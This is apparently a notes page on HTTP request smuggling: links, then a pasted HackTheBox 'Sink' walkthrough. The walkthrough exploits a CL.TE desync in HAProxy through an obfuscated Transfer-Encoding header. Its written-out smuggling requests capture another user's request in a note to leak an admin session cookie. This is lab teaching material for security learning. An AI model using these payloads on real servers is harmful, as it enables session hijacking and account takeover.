

SMUGGLING

https://www.akamai.com/blog/security/http-2-request-smulggling

<br>
<br>
<br>
https://chr0x6eos.github.io/2021/09/18/htb-Sink.html
<br>
https://0xdf.gitlab.io/2021/09/18/htb-sink.html
<br>
https://freakydodo.medium.com/hackthebox-sink-writeup-htb-walkthrough-7f9ffb9652dc
<br>
https://fdlucifer.github.io/2021/02/07/sink/
<br>
https://github.com/PortSwigger/http-request-smuggler
<br>
https://github.com/chenjj/Awesome-HTTPRequestSmuggling
<br>
<br>
<br>

Looking at the response, we can notice something quite interesting: Via: haproxy. Let us research what haproxy is and if there are any vulnerabilities.

HAProxy research
After some searching I eventually tried to look for exploits on GitHub using this Google-query. This gives us a GitHub page that showcases a HTTP-Request smuggling vulnerability in HAProxy using CL.TE (Content-Length & Transfer-Encoding). Normally, the HAProxy will prioritize the Transfer-Encoding, stripping the Content-Length and therefore removing our smuggled request. By obfuscating the TE-header, the proxy will use the CL to determine the length of the request, forwarding our smuggled request. The backend however, will use the Transfer-Encoding and therefore interpret our smuggled request.

Example (Taken from the GitHub Post):

Normal request
Request to HAProxy:

POST / HTTP/1.1
Host: 127.0.0.1:1080
Content-Length: 6
Transfer-Encoding: chunked

0

X
Request forwarded to backend:

POST / HTTP/1.1
Host: 127.0.0.1:1080
Transfer-Encoding: chunked
X-Forwarded-For: 172.21.0.1

0
The X is stripped!

Obfuscated TE
Request to HAProxy:

POST / HTTP/1.1
Host: 127.0.0.1:1080
Content-Length: 6
Transfer-Encoding:[\x0b]chunked

0

X
Request forwarded to backend:

POST / HTTP/1.1
Host: 127.0.0.1:1080
Content-Length: 6
Transfer-Encoding:
                  chunked
X-Forwarded-For: 172.21.0.1

0

X
The X gets forwarded!

Exploiting CL.TE HTTP request smuggling
Let us use the knowledge we just learned and try to exploit this vulnerability. Let us try to smuggle our request to create two notes.

For this we have to create follow request:

POST /notes HTTP/1.1
Host: 10.10.10.225:5000
Content-Type: application/x-www-form-urlencoded
Content-Length: 252
Connection: keep-alive
Cookie: session=eyJlbWFpbCI6ImNocm9ub3NAbWFpbC5jb20ifQ.YFH7WA.tGBwSBQs-zae1j911VVDD3m_MI4
Transfer-Encoding:[\x0b]chunked

6
note=t
0

POST /notes HTTP/1.1
Host: localhost:5000
Content-Type: application/x-www-form-urlencoded
Content-Length: 500
Connection: keep-alive
Cookie: session=eyJlbWFpbCI6ImNocm9ub3NAbWFpbC5jb20ifQ.YFH7WA.tGBwSBQs-zae1j911VVDD3m_MI4

note=
Obfuscating TE-Header
We now need to obfuscate the TE-Header. Luckily, we can easily do this using Burp:

Obfuscating TE

We can now send the request and check how many notes were created.

Notes created

We successfully smuggled the request and created two notes! Let us check each note out!

Note 1

Hmm this note is empty… Let us see if the other note holds any information…

Note 2

We see a parts of a request in the second note!

Leaking HTTP-request
As only the smuggled request results into an interesting request, let us try to make the first request a comment and the second request a note. This way, we only create one note and this note will container the leaked request. Furthermore, let us increase the Content-Length of the second post to get more parts of the request. Let us increase it from 100 to 250 (same length as the first request).

POST /comment HTTP/1.1
Host: 10.10.10.225:5000
Content-Type: application/x-www-form-urlencoded
Content-Length: 250
Connection: keep-alive
Cookie: session=eyJlbWFpbCI6ImNocm9ub3NAbWFpbC5jb20ifQ.YFH7WA.tGBwSBQs-zae1j911VVDD3m_MI4
Transfer-Encoding:[\x0b]chunked

4
msg=
0

POST /notes HTTP/1.1
Host: localhost:5000
Content-Type: application/x-www-form-urlencoded
Content-Length: 250
Connection: keep-alive
Cookie: session=eyJlbWFpbCI6ImNocm9ub3NAbWFpbC5jb20ifQ.YFH7WA.tGBwSBQs-zae1j911VVDD3m_MI4

note=
Note 3

We can see now parts of a session-cookie that differs from ours. However, the request is still not complete! Let us increase the Content-Length once again!

POST /comment HTTP/1.1
Host: 10.10.10.225:5000
Content-Type: application/x-www-form-urlencoded
Content-Length: 250
Connection: keep-alive
Cookie: session=eyJlbWFpbCI6ImNocm9ub3NAbWFpbC5jb20ifQ.YFH7WA.tGBwSBQs-zae1j911VVDD3m_MI4
Transfer-Encoding:[\x0b]chunked

4
msg=
0

POST /notes HTTP/1.1
Host: localhost:5000
Content-Type: application/x-www-form-urlencoded
Content-Length: 300
Connection: keep-alive
Cookie: session=eyJlbWFpbCI6ImNocm9ub3NAbWFpbC5jb20ifQ.YFH7WA.tGBwSBQs-zae1j911VVDD3m_MI4

note=
Note 4

We finally get the full request! The session-cookie could be the cookie of the administrator! Let us replace our cookie with the leaked one.

Admin session on port 5000
Replacing our cookie and reloading /notes, we get following page shown:
